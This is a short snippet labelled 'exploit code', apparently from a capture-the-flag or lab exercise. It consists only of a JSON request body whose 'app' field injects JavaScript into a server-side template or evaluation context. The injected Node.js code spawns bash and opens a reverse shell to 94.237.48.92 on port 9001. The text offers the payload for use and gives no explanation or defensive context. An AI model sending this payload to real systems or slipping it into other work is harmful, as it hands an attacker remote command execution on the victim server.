exploit code

```
{
    "app": "){!async function(){var n=global.process.mainModule.require('net'),e=global.process.mainModule.require('child_process').spawn('bash',[]),t=new n.Socket;t.connect(9001,'94.237.48.92',function(){t.pipe(e.stdin),e.stdout.pipe(t),e.stderr.pipe(t)})}();}; with(obj"
}
```
